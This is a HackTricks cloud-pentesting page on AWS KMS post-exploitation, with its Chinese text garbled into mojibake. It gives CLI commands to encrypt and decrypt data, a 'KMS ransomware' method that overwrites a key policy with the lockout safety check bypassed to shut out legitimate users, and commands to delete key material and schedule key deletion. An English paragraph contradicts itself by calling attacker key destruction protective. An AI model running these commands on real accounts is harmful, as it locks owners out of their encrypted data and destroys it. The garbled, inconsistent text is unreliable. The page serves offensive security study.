# AWS - KMSåæ¸—é€

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆçš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## KMS

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../../aws-security/aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../../aws-security/aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### åŠ å¯†/è§£å¯†ä¿¡æ¯

* ä½¿ç”¨**å¯¹ç§°**å¯†é’¥
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
* ä½¿ç”¨**éå¯¹ç§°**å¯†é’¥ï¼š
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMSå‹’ç´¢è½¯ä»¶

å…·æœ‰KMSç‰¹æƒè®¿é—®æƒé™çš„æ”»å‡»è€…å¯ä»¥ä¿®æ”¹å¯†é’¥çš„KMSç­–ç•¥ï¼Œå¹¶æˆäºˆè‡ªå·±å¯¹è¿™äº›å¯†é’¥çš„è®¿é—®æƒé™ï¼Œä»è€Œåˆ é™¤æˆäºˆåˆæ³•è´¦æˆ·çš„è®¿é—®æƒé™ã€‚

ç„¶åï¼Œåˆæ³•è´¦æˆ·çš„ç”¨æˆ·å°†æ— æ³•è®¿é—®ä½¿ç”¨è¿™äº›å¯†é’¥åŠ å¯†çš„ä»»ä½•æœåŠ¡çš„ä»»ä½•ä¿¡æ¯ï¼Œä»è€Œåœ¨è´¦æˆ·ä¸Šåˆ›å»ºä¸€ä¸ªç®€å•ä½†æœ‰æ•ˆçš„å‹’ç´¢è½¯ä»¶ã€‚

{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œæ­¤æ”»å‡»åªä¼šå½±å“**å®¢æˆ·ç®¡ç†çš„å¯†é’¥**ï¼Œè€Œä¸ä¼šå½±å“**AWSæ‰˜ç®¡çš„å¯†é’¥**ã€‚

è¿˜è¯·æ³¨æ„éœ€è¦ä½¿ç”¨å‚æ•°**`--bypass-policy-lockout-safety-check`**ï¼ˆåœ¨Webæ§åˆ¶å°ä¸­ç¼ºå°‘æ­¤é€‰é¡¹ï¼Œå› æ­¤åªèƒ½é€šè¿‡CLIè¿›è¡Œæ­¤æ”»å‡»ï¼‰ã€‚
{% endhint %}
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
### é”€æ¯å¯†é’¥

Once you have successfully compromised an AWS environment and gained access to the AWS Key Management Service (KMS), you may want to destroy any keys that could potentially be used against you or leave traces of your activities. Destroying keys ensures that any encrypted data protected by those keys becomes inaccessible.

To destroy a key in AWS KMS, you can use the `schedule-key-deletion` API call. This call sets a waiting period before the key is permanently deleted, allowing you to recover the key if needed within that time frame. The default waiting period is 30 days, but you can specify a shorter or longer period as required.

To schedule the deletion of a key, you need to provide the key's Amazon Resource Name (ARN) and the waiting period in days. The ARN uniquely identifies the key within AWS KMS.

Once the key deletion is scheduled, you can check the status of the deletion using the `describe-key` API call. This call provides information about the key, including its deletion status.

It is important to note that once the waiting period expires, the key is permanently deleted and cannot be recovered. Therefore, exercise caution when scheduling key deletions and ensure that you have a backup plan in place if necessary.

By destroying keys in AWS KMS, you can effectively eliminate any potential risks associated with compromised keys and protect the confidentiality of encrypted data.
```bash
# Destoy they key material previously imported making the key useless
aws kms delete-imported-key-material --key-id 1234abcd-12ab-34cd-56ef-1234567890ab

# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—å¥½å¤„ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“ï¼Œ[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
